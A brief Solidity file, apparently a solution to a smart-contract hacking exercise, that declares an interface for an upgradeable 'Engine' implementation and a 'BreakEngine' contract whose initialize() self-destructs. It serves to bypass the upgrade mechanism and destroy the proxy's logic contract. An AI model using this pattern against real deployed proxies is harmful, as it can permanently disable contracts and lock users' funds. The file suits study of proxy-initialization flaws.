// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
 
interface Engine {

    function initialize() external;
    function horsePower() view external returns(uint256);
    function upgrader() view external returns (address);
    // Upgrade the implementation of the proxy to `newImplementation`
    // subsequently execute the function call
    function upgradeToAndCall(address newImplementation, bytes memory data) external payable;

}

contract BreakEngine{
    function initialize() external{
        selfdestruct(payable(msg.sender));
    }
}